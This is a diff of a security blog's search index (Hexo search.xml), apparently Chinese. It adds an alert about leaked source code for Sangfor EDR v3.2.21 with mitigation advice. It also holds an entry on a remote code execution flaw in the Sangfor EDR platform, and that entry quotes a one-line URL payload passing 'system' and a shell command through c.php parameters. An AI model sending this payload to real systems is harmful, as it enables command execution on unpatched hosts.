@@ -1,9 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>深信服EDR v3.2.21 (20200703)源码泄露</title>
+    <url>/2020/08/19/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>解决之前版本的远程任意代码注入漏洞，深信服EDR 更新到3.2.21 版本</p>
+<p>更新文献：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p>
+<p>早期可能误传导致源码泄露（现阶段官网社区已经删除）</p>
+<p><img src="0.png" alt="0"></p>
+<p>由于特殊时期，具体详情暂不描述</p>
+<h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><p>源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。</p>
+<h2 id="HW期间建议"><a href="#HW期间建议" class="headerlink" title="HW期间建议"></a>HW期间建议</h2><p>1.对EDR管理平台做acl策略，限制ip；</p>
+<p>2.暂时下线</p>
+]]></content>
+      <categories>
+        <category>漏洞告警</category>
+      </categories>
+      <tags>
+        <tag>告警信息</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>深信服EDR终端检测平台RCE漏洞</title>
     <url>/2020/08/17/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 title: 深信服EDR终端检测平台RCE漏洞</p>
+    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 </p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd</span><br></pre></td></tr></table></figure>
 
 <p><img src="0.png" alt="0"></p>
